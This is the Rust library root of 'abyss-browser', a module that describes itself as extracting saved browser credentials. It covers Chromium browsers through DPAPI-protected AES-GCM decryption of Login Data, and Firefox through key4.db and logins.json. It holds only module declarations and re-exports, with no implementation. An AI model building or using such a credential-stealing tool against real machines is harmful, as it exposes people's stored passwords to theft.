//! abyss-browser: Browser credential extraction for Abyss.
//!
//! Supports Chromium-family browsers (Chrome, Edge, Brave, etc.) via
//! AES-256-GCM decryption of the Login Data SQLite database using a state key
//! protected by Windows DPAPI.
//!
//! Also supports Firefox via `key4.db` + `logins.json` extraction (no master
//! password scenario).

pub mod chromium;
pub mod error;
pub mod firefox;

pub use chromium::{BrowserCredential, extract_chromium_credentials};
pub use error::BrowserError;
pub use firefox::{
    FirefoxCredential, FirefoxProfile, extract_firefox_credentials,
};
